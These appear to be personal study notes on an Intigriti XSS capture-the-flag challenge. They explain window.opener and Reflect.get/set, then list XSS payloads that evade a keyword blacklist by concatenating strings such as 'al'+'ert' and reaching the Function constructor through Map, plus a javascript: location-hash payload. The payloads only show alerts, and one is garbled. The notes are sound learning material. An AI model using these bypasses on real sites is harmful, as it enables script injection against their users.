## https://challenge-0523.intigriti.io/challenge/xss.html
<br>
https://www.youtube.com/watch?v=1iQ-oeLFZBs
## opener
```
// Open a new window
var newWindow = window.open('https://www.example.com', '_blank');

// Access the opener property in the new window
var openingWindow = newWindow.opener;

// Now, openingWindow refers to the original window that opened the new one

```
## code meaning
```
Object.getOwnPropertyNames('document') //gives list of propertis
Object.getPrototypeOf(myObject); //to get the prototype
regex.test(string)
<img src="data:image/png;base64,iVBORw0KG... (base64 encoded image data)" alt="Embedded Image">
Reflect.get()
Returns the value of the property. Works like getting a property from an object (target[propertyKey]) as a function
const myAlertFunction = Reflect.get(window, 'alert');
myAlertFunction('Hello, world!'); // This will show an alert with the message "Hello, world!"
Reflect.get(window, 'alert')("alertiragdha")

Reflect.set()
A function that assigns values to properties. Returns a boolean that is true if the update was successful.
```
## practice cheks
```
Reflect.get(Map,'constructor')(alert("alertiragdha"))()
Reflect.get(Map,'co'+'nstructor')('aler'+'t(document'+'t.domain)')()
we can use not just map but window,document as well but as they are blacklisted we cant use them
we are using this get() thing as we can use alert as a concatenation of strings so that it will not be blacklisted ,to use as a string we use this method
```
## elements with parent as window
```
for (let el in window) {
  try {
    if (window[el].hasOwnProperty('top') && window[el]['top'] === window) {
      console.log(el);
    }
  } catch (err) {
    // Handle any potential errors
  }
}

for (let el in frames) {
 console.log(el)
}
Reflect.get(frames,'al'+'ert')(Reflect.get(frames,'docu'+'ment').domain)
Reflect.set(frames,'locatio'+'n',Reflect.get(frames,'locatio'+'n').hash.substr('a'.length))#javascript:alert("afafa")
```
